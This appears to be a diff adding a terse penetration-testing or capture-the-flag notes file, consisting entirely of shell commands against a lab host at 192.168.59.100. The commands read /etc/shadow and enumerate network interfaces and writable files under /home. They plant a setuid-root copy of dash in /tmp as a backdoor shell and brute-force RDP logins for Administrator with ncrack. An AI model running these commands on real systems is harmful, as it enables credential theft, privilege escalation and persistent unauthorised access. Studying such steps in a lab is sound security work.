@@ -1,0 +1,27 @@
+
+$ ls 
+$ cd /etc
+$ cat shadow 
+
+$ netstat -antup
+$ ifconfig
+
+$ cd /home
+$ ls 
+
+$ find /home/ -writable -type f 2>/dev/null
+
+$ ls -l monitor_dicom.sh
+
+$ head monitor_dicom.sh
+
+# https://nmap.org/ndiff/
+
+$ cp /bin/dash /tmp/shell; chown root /tmp/shell; chmod u+s /tmp/shell
+
+$ ncrack rdp://192.168.59.100 --user Administrator -v -f
+
+$ rdesktop 192.168.59.100
+
+# id
+# crontab -l
